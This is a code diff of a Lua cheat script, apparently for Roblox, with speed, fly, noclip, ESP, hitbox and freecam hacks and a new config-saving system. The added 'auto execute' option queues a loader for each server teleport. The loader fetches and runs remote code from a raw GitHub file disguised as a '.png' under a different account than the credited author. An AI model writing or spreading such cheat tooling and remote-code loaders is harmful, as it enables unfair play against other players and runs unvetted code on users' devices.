@@ -1,5 +1,5 @@
 --[[
-    ToanCreator GUI - Faster Freecam Sensitivity & Ultra-Small ShiftLock (15px)
+    ToanCreator GUI - Option Bug Fixes & Auto Save File
     Mobile Optimized (270x360)
     Credit: ToanCreator
 ]]
@@ -8,6 +8,8 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
@@ -21,8 +23,10 @@ pcall(function()
 end)
 
 --==================================================
--- CONFIG & COLORS
+-- CONFIG & FILE STORAGE SYSTEM
 --==================================================
+
+local CONFIG_FILE_NAME = "ToanCreator_Configs.json"
 
 local COLORS = {
     Background = Color3.fromRGB(18, 18, 22),
@@ -71,7 +75,75 @@ local SavedConfigs = {}
 local SelectedPlayer = nil
 local SelectedLocation = nil
 
--- Freecam System Variables
+-- Hàm Color3 sang Table & ngược lại để lưu JSON
+local function Color3ToTable(c) return {R = c.R, G = c.G, B = c.B} end
+local function TableToColor3(t) return Color3.new(t.R or 1, t.G or 1, t.B or 1) end
+
+local function LoadSavedConfigsFromFile()
+    if readfile and isfile and isfile(CONFIG_FILE_NAME) then
+        local success, result = pcall(function()
+            local decoded = HttpService:JSONDecode(readfile(CONFIG_FILE_NAME))
+            local formatted = {}
+            for cfgName, cfgData in pairs(decoded) do
+                formatted[cfgName] = {
+                    Speed = cfgData.Speed or { Enabled = false, Value = 16 },
+                    Jump = cfgData.Jump or { Enabled = false, Value = 50 },
+                    Fly = cfgData.Fly or false,
+                    Noclip = cfgData.Noclip or false,
+                    NoGravity = cfgData.NoGravity or false,
+                    PlayerESP = cfgData.PlayerESP or false,
+                    PlayerESPColor = cfgData.PlayerESPColor and TableToColor3(cfgData.PlayerESPColor) or Color3.fromRGB(255,255,255),
+                    PlayerHitbox = cfgData.PlayerHitbox or false,
+                    PlayerHitboxColor = cfgData.PlayerHitboxColor and TableToColor3(cfgData.PlayerHitboxColor) or Color3.fromRGB(255,80,80),
+                    PlayerTrace = cfgData.PlayerTrace or false,
+                    PlayerTraceColor = cfgData.PlayerTraceColor and TableToColor3(cfgData.PlayerTraceColor) or Color3.fromRGB(0,170,255),
+                    DistanceCheck = cfgData.DistanceCheck or false,
+                    Freecam = cfgData.Freecam or false,
+                    Fullbright = cfgData.Fullbright or false,
+                    FixLag = cfgData.FixLag or false,
+                    AutoExecute = cfgData.AutoExecute or false,
+                    ShiftLock = cfgData.ShiftLock or false
+                }
+            end
+            return formatted
+        end)
+        if success and result then SavedConfigs = result end
+    end
+end
+
+local function SaveConfigsToFile()
+    if writefile then
+        pcall(function()
+            local dataToSave = {}
+            for cfgName, cfgData in pairs(SavedConfigs) do
+                dataToSave[cfgName] = {
+                    Speed = cfgData.Speed,
+                    Jump = cfgData.Jump,
+                    Fly = cfgData.Fly,
+                    Noclip = cfgData.Noclip,
+                    NoGravity = cfgData.NoGravity,
+                    PlayerESP = cfgData.PlayerESP,
+                    PlayerESPColor = Color3ToTable(cfgData.PlayerESPColor or Color3.fromRGB(255,255,255)),
+                    PlayerHitbox = cfgData.PlayerHitbox,
+                    PlayerHitboxColor = Color3ToTable(cfgData.PlayerHitboxColor or Color3.fromRGB(255,80,80)),
+                    PlayerTrace = cfgData.PlayerTrace,
+                    PlayerTraceColor = Color3ToTable(cfgData.PlayerTraceColor or Color3.fromRGB(0,170,255)),
+                    DistanceCheck = cfgData.DistanceCheck,
+                    Freecam = cfgData.Freecam,
+                    Fullbright = cfgData.Fullbright,
+                    FixLag = cfgData.FixLag,
+                    AutoExecute = cfgData.AutoExecute,
+                    ShiftLock = cfgData.ShiftLock
+                }
+            end
+            writefile(CONFIG_FILE_NAME, HttpService:JSONEncode(dataToSave))
+        end)
+    end
+end
+
+LoadSavedConfigsFromFile()
+
+-- Freecam Variables
 local FreecamCFrame = CFrame.new()
 local freecamYaw = 0
 local freecamPitch = 0
@@ -79,6 +151,7 @@ local freecamPitch = 0
 -- System Tracking
 local PlayerStats = {}
 local TraceLines = {}
+local UI_Controls = {} -- Lưu trữ UI controls để reset giao diện
 
 --==================================================
 -- UTILS & SCREEN GUI
@@ -203,7 +276,7 @@ Tabs["MOVE"].TextColor3 = Color3.new(1, 1, 1)
 Pages["MOVE"].Visible = true
 
 --==================================================
--- UI COMPONENTS
+-- UI COMPONENTS & CONTROLS BINDING
 --==================================================
 
 local function BindLongPress(button, duration, callback)
@@ -228,7 +301,7 @@ local function BindLongPress(button, duration, callback)
     end)
 end
 
-local function CreateCombinedInput(parent, labelText, defaultVal, onValueChange, onToggle)
+local function CreateCombinedInput(id, parent, labelText, defaultVal, onValueChange, onToggle)
     local holder = Create("Frame", { Size = UDim2.new(1, -2, 0, 32), BackgroundColor3 = COLORS.Panel, Parent = parent })
     AddCorner(holder, 5)
     Create("TextLabel", { Size = UDim2.new(1, -110, 1, 0), Position = UDim2.new(0, 8, 0, 0), BackgroundTransparency = 1, Text = labelText, TextColor3 = COLORS.Text, TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left, Parent = holder })
@@ -241,22 +314,31 @@ local function CreateCombinedInput(parent, labelText, defaultVal, onValueChange,
     AddStroke(check, Color3.fromRGB(75, 75, 85), 1)
 
     local state = false
-    check.MouseButton1Click:Connect(function()
-        state = not state
+    local function setCheckState(st)
+        state = st
         check.BackgroundColor3 = state and COLORS.Accent or COLORS.Button
         check.Text = state and "✓" or ""
         check.TextColor3 = Color3.new(1, 1, 1)
         if onToggle then onToggle(state) end
+    end
+
+    check.MouseButton1Click:Connect(function()
+        setCheckState(not state)
     end)
 
     input.FocusLost:Connect(function()
         local num = tonumber(input.Text)
         if num then if onValueChange then onValueChange(num) end else input.Text = tostring(defaultVal) end
     end)
+
+    UI_Controls[id] = {
+        SetState = setCheckState,
+        SetValue = function(v) input.Text = tostring(v); if onValueChange then onValueChange(v) end end
+    }
     return holder
 end
 
-local function CreateCheckbox(parent, labelText, onToggle)
+local function CreateCheckbox(id, parent, labelText, onToggle)
     local holder = Create("Frame", { Size = UDim2.new(1, -2, 0, 32), BackgroundColor3 = COLORS.Panel, Parent = parent })
     AddCorner(holder, 5)
     Create("TextLabel", { Size = UDim2.new(1, -40, 1, 0), Position = UDim2.new(0, 8, 0, 0), BackgroundTransparency = 1, Text = labelText, TextColor3 = COLORS.Text, TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left, Parent = holder })
@@ -266,17 +348,23 @@ local function CreateCheckbox(parent, labelText, onToggle)
     AddStroke(check, Color3.fromRGB(75, 75, 85), 1)
 
     local state = false
-    check.MouseButton1Click:Connect(function()
-        state = not state
+    local function setCheckState(st)
+        state = st
         check.BackgroundColor3 = state and COLORS.Accent or COLORS.Button
         check.Text = state and "✓" or ""
         check.TextColor3 = Color3.new(1, 1, 1)
         if onToggle then onToggle(state) end
+    end
+
+    check.MouseButton1Click:Connect(function()
+        setCheckState(not state)
     end)
+
+    UI_Controls[id] = { SetState = setCheckState }
     return check
 end
 
-local function CreateESPCombo(parent, labelText, defaultColor, onColorChange, onToggle)
+local function CreateESPCombo(id, parent, labelText, defaultColor, onColorChange, onToggle)
     local holder = Create("Frame", { Size = UDim2.new(1, -2, 0, 32), BackgroundColor3 = COLORS.Panel, Parent = parent })
     AddCorner(holder, 5)
     Create("TextLabel", { Size = UDim2.new(1, -70, 1, 0), Position = UDim2.new(0, 8, 0, 0), BackgroundTransparency = 1, Text = labelText, TextColor3 = COLORS.Text, TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left, Parent = holder })
@@ -297,13 +385,22 @@ local function CreateESPCombo(parent, labelText, defaultColor, onColorChange, on
     end)
 
     local state = false
-    check.MouseButton1Click:Connect(function()
-        state = not state
+    local function setCheckState(st)
+        state = st
         check.BackgroundColor3 = state and COLORS.Accent or COLORS.Button
         check.Text = state and "✓" or ""
         check.TextColor3 = Color3.new(1, 1, 1)
         if onToggle then onToggle(state) end
+    end
+
+    check.MouseButton1Click:Connect(function()
+        setCheckState(not state)
     end)
+
+    UI_Controls[id] = {
+        SetState = setCheckState,
+        SetColor = function(c) colorBtn.BackgroundColor3 = c; if onColorChange then onColorChange(c) end end
+    }
     return holder
 end
 
@@ -311,8 +408,8 @@ end
 -- MOVE TAB SETUP
 --==================================================
 
-CreateCombinedInput(MovePage, "speed: enter num", Settings.Speed.Value, function(v) Settings.Speed.Value = v end, function(s) Settings.Speed.Enabled = s end)
-CreateCombinedInput(MovePage, "jump: enter num", Settings.Jump.Value, function(v) Settings.Jump.Value = v end, function(s) Settings.Jump.Enabled = s end)
+CreateCombinedInput("Speed", MovePage, "speed: enter num", Settings.Speed.Value, function(v) Settings.Speed.Value = v end, function(s) Settings.Speed.Enabled = s end)
+CreateCombinedInput("Jump", MovePage, "jump: enter num", Settings.Jump.Value, function(v) Settings.Jump.Value = v end, function(s) Settings.Jump.Enabled = s end)
 
 local FlyControls = Create("Frame", { Size = UDim2.new(0, 100, 0, 45), Position = UDim2.new(1, -110, 0.5, -22), BackgroundTransparency = 1, Visible = false, Parent = ScreenGui })
 local FlyUp = Create("TextButton", { Size = UDim2.new(0, 45, 0, 45), Position = UDim2.new(0, 0, 0, 0), BackgroundColor3 = COLORS.Accent, Text = "↑", TextColor3 = Color3.new(1,1,1), TextSize = 22, Font = Enum.Font.GothamBold, Parent = FlyControls })
@@ -333,9 +430,9 @@ end
 BindPressHold(FlyUp, function(st) flyUpHeld = st end)
 BindPressHold(FlyDown, function(st) flyDownHeld = st end)
 
-CreateCheckbox(MovePage, "fly", function(v) Settings.Fly = v; FlyControls.Visible = v end)
-CreateCheckbox(MovePage, "noclip", function(v) Settings.Noclip = v end)
-CreateCheckbox(MovePage, "no gravity", function(v)
+CreateCheckbox("Fly", MovePage, "fly", function(v) Settings.Fly = v; FlyControls.Visible = v end)
+CreateCheckbox("Noclip", MovePage, "noclip", function(v) Settings.Noclip = v end)
+CreateCheckbox("NoGravity", MovePage, "no gravity", function(v)
     Settings.NoGravity = v
     if not v and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local bv = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("NoGravForce")
@@ -424,7 +521,7 @@ local function RefreshLocationList()
         lBtn.MouseButton1Click:Connect(function() SelectedLocation = loc; RefreshLocationList() end)
         
         BindLongPress(lBtn, 1, function()
-            ShowConfirm("Bạn muốn xóa vị trí '"..loc.Name.."'?", function()
+            ShowConfirm("Xóa vị trí '"..loc.Name.."'?", function()
                 if loc.Part then loc.Part:Destroy() end
                 table.remove(Locations, idx)
                 if SelectedLocation == loc then SelectedLocation = nil end
@@ -472,24 +569,22 @@ end)
 -- ESP TAB SETUP
 --==================================================
 
-CreateESPCombo(ESPPage, "player ESP", Settings.PlayerESPColor, function(c) Settings.PlayerESPColor = c end, function(s) Settings.PlayerESP = s end)
-CreateESPCombo(ESPPage, "player hitbox", Settings.PlayerHitboxColor, function(c) Settings.PlayerHitboxColor = c end, function(s) Settings.PlayerHitbox = s end)
-CreateESPCombo(ESPPage, "player trace", Settings.PlayerTraceColor, function(c) Settings.PlayerTraceColor = c end, function(s) Settings.PlayerTrace = s end)
+CreateESPCombo("PlayerESP", ESPPage, "player ESP", Settings.PlayerESPColor, function(c) Settings.PlayerESPColor = c end, function(s) Settings.PlayerESP = s end)
+CreateESPCombo("PlayerHitbox", ESPPage, "player hitbox", Settings.PlayerHitboxColor, function(c) Settings.PlayerHitboxColor = c end, function(s) Settings.PlayerHitbox = s end)
+CreateESPCombo("PlayerTrace", ESPPage, "player trace", Settings.PlayerTraceColor, function(c) Settings.PlayerTraceColor = c end, function(s) Settings.PlayerTrace = s end)
 
-CreateCheckbox(ESPPage, "distance check", function(v) Settings.DistanceCheck = v end)
+CreateCheckbox("DistanceCheck", ESPPage, "distance check", function(v) Settings.DistanceCheck = v end)
 
--- FREECAM CONFIG & LOGIC (ĐÃ TĂNG TỐC ĐỘ XOAY CAMERA CẢM ỨNG / MOUSE)
 UserInputService.InputChanged:Connect(function(input, gameProcessed)
     if not Settings.Freecam then return end
     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
         local delta = input.Delta
-        -- Tăng độ nhạy từ 0.003 lên 0.008 để xoay màn hình nhanh hơn
         freecamYaw = freecamYaw - delta.X * 0.008
         freecamPitch = math.clamp(freecamPitch - delta.Y * 0.008, math.rad(-89), math.rad(89))
     end
 end)
 
-CreateCheckbox(ESPPage, "freecam", function(v)
+CreateCheckbox("Freecam", ESPPage, "freecam", function(v)
     Settings.Freecam = v
     FlyControls.Visible = v
     local char = LocalPlayer.Character
@@ -519,11 +614,11 @@ CreateCheckbox(ESPPage, "freecam", function(v)
 end)
 
 --==================================================
--- OPTION TAB SETUP
+-- OPTION TAB SETUP & FIXES
 --==================================================
 
-CreateCheckbox(OptionPage, "fullbright", function(v) Settings.Fullbright = v end)
-CreateCheckbox(OptionPage, "fixlag", function(v)
+CreateCheckbox("Fullbright", OptionPage, "fullbright", function(v) Settings.Fullbright = v end)
+CreateCheckbox("FixLag", OptionPage, "fixlag", function(v)
     Settings.FixLag = v
     if v then
         for _, obj in ipairs(workspace:GetDescendants()) do
@@ -531,9 +626,22 @@ CreateCheckbox(OptionPage, "fixlag", function(v)
         end
     end
 end)
-CreateCheckbox(OptionPage, "auto execute", function(v) Settings.AutoExecute = v end)
 
--- MOBILE SHIFT LOCK UI BUTTON (THU NHỎ CÒN 15px & NẰM SÁT GÓC DƯỚI BÊN PHẢI)
+-- FIX 1: AUTO EXECUTE HOẠT ĐỘNG KHI CHUYỂN SERVER
+local queueOnTeleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+
+CreateCheckbox("AutoExecute", OptionPage, "auto execute", function(v)
+    Settings.AutoExecute = v
+    if v and queueOnTeleport then
+        local scriptSource = [[
+            repeat task.wait() until game:IsLoaded()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/T4H4KER/Test/refs/heads/main/1781919848774.png"))()
+        ]]
+        pcall(function() queueOnTeleport(scriptSource) end)
+    end
+end)
+
+-- MOBILE SHIFT LOCK UI BUTTON (15px)
 local ShiftLockBtn = Create("ImageButton", {
     Size = UDim2.new(0, 15, 0, 15),
     Position = UDim2.new(1, -20, 1, -20),
@@ -546,7 +654,7 @@ local ShiftLockBtn = Create("ImageButton", {
 AddCorner(ShiftLockBtn, 4)
 AddStroke(ShiftLockBtn, COLORS.Accent, 1)
 
-CreateCheckbox(OptionPage, "locks", function(v)
+CreateCheckbox("ShiftLock", OptionPage, "locks", function(v)
     Settings.ShiftLock = v
     ShiftLockBtn.Visible = v
 end)
@@ -557,7 +665,39 @@ ShiftLockBtn.MouseButton1Click:Connect(function()
     ShiftLockBtn.BackgroundColor3 = shiftLockActive and COLORS.Accent or COLORS.Panel
 end)
 
--- NÚT RESET & CONFIG DẠNG HÌNH CHỮ NHẬT
+-- HÀM ÁP DỤNG SETTINGS VÀO GIAO DIỆN UI
+local function ApplySettingsToUI(newSettings)
+    for k, v in pairs(newSettings) do Settings[k] = v end
+
+    if UI_Controls["Speed"] then UI_Controls["Speed"].SetState(Settings.Speed.Enabled); UI_Controls["Speed"].SetValue(Settings.Speed.Value) end
+    if UI_Controls["Jump"] then UI_Controls["Jump"].SetState(Settings.Jump.Enabled); UI_Controls["Jump"].SetValue(Settings.Jump.Value) end
+
+    if UI_Controls["Fly"] then UI_Controls["Fly"].SetState(Settings.Fly) end
+    if UI_Controls["Noclip"] then UI_Controls["Noclip"].SetState(Settings.Noclip) end
+    if UI_Controls["NoGravity"] then UI_Controls["NoGravity"].SetState(Settings.NoGravity) end
+
+    if UI_Controls["PlayerESP"] then UI_Controls["PlayerESP"].SetState(Settings.PlayerESP); UI_Controls["PlayerESP"].SetColor(Settings.PlayerESPColor) end
+    if UI_Controls["PlayerHitbox"] then UI_Controls["PlayerHitbox"].SetState(Settings.PlayerHitbox); UI_Controls["PlayerHitbox"].SetColor(Settings.PlayerHitboxColor) end
+    if UI_Controls["PlayerTrace"] then UI_Controls["PlayerTrace"].SetState(Settings.PlayerTrace); UI_Controls["PlayerTrace"].SetColor(Settings.PlayerTraceColor) end
+
+    if UI_Controls["DistanceCheck"] then UI_Controls["DistanceCheck"].SetState(Settings.DistanceCheck) end
+    if UI_Controls["Freecam"] then UI_Controls["Freecam"].SetState(Settings.Freecam) end
+
+    if UI_Controls["Fullbright"] then UI_Controls["Fullbright"].SetState(Settings.Fullbright) end
+    if UI_Controls["FixLag"] then UI_Controls["FixLag"].SetState(Settings.FixLag) end
+    if UI_Controls["AutoExecute"] then UI_Controls["AutoExecute"].SetState(Settings.AutoExecute) end
+    if UI_Controls["ShiftLock"] then UI_Controls["ShiftLock"].SetState(Settings.ShiftLock) end
+
+    -- Trạng thái Reset nhân vật/camera
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum.WalkSpeed = 16
+        hum.JumpPower = 50
+        hum.UseJumpPower = false
+    end
+end
+
+-- NÚT RESET & CONFIG
 local OptionBtnHolder = Create("Frame", { Size = UDim2.new(1, -2, 0, 36), BackgroundTransparency = 1, Parent = OptionPage })
 Create("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 6), Parent = OptionBtnHolder })
 
@@ -567,14 +707,15 @@ AddCorner(ResetBtn, 6)
 local ConfigBtn = Create("TextButton", { Size = UDim2.new(0.5, -3, 1, 0), BackgroundColor3 = COLORS.Accent, Text = "Config", TextColor3 = Color3.new(1,1,1), TextSize = 11, Font = Enum.Font.GothamBold, Parent = OptionBtnHolder })
 AddCorner(ConfigBtn, 6)
 
+-- FIX 2: RESET DEFAULT CẬP NHẬT TRỰC TIẾP LÊN UI
 ResetBtn.MouseButton1Click:Connect(function()
     ShowConfirm("Khôi phục tất cả cài đặt về mặc định?", function()
-        for k, v in pairs(DefaultSettings) do Settings[k] = v end
-        print("Settings reset to default!")
+        ApplySettingsToUI(DefaultSettings)
+        print("Settings successfully reset to default!")
     end)
 end)
 
--- POPUP CONFIG
+-- POPUP CONFIG & FILE SAVING
 local ConfigOverlay = Create("Frame", { Size = UDim2.new(1, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0.5, Visible = false, ZIndex = 30, Parent = ScreenGui })
 local ConfigBoard = Create("Frame", { Size = UDim2.new(0, 220, 0, 230), Position = UDim2.new(0.5, -110, 0.5, -115), BackgroundColor3 = COLORS.Background, ZIndex = 31, Parent = ConfigOverlay })
 AddCorner(ConfigBoard, 8)
@@ -606,26 +747,29 @@ local function RefreshConfigList()
         AddCorner(loadBtn, 3)
 
         loadBtn.MouseButton1Click:Connect(function()
-            for k, v in pairs(cfgData) do Settings[k] = v end
+            ApplySettingsToUI(cfgData)
             ConfigOverlay.Visible = false
-            print("Config loaded: "..name)
+            print("Loaded Config: "..name)
         end)
 
         BindLongPress(item, 1, function()
             ShowConfirm("Xóa config '"..name.."'?", function()
                 SavedConfigs[name] = nil
+                SaveConfigsToFile()
                 RefreshConfigList()
             end)
         end)
     end
 end
 
+-- FIX 3: TỰ ĐỘNG GHI FILE KHI TẠO CONFIG MỚI
 SaveConfigBtn.MouseButton1Click:Connect(function()
     local name = ConfigNameInput.Text
     if name ~= "" then
         local copy = {}
         for k, v in pairs(Settings) do copy[k] = v end
         SavedConfigs[name] = copy
+        SaveConfigsToFile()
         ConfigNameInput.Text = ""
         RefreshConfigList()
     end
@@ -740,7 +884,7 @@ RunService.RenderStepped:Connect(function(deltaTime)
         Lighting.GlobalShadows = false
     end
 
-    -- FIXED SHIFTLOCK
+    -- SHIFTLOCK
     if Settings.ShiftLock and shiftLockActive and myRoot then
         local lookVector = Camera.CFrame.LookVector
         myRoot.CFrame = CFrame.new(myRoot.Position, myRoot.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
@@ -884,4 +1028,4 @@ CloseButton.MouseButton1Click:Connect(function()
     end)
 end)
 
-print("ToanCreator GUI v8 Updated Successfully!")
+print("ToanCreator GUI v8 - Option Fixed Successfully!")
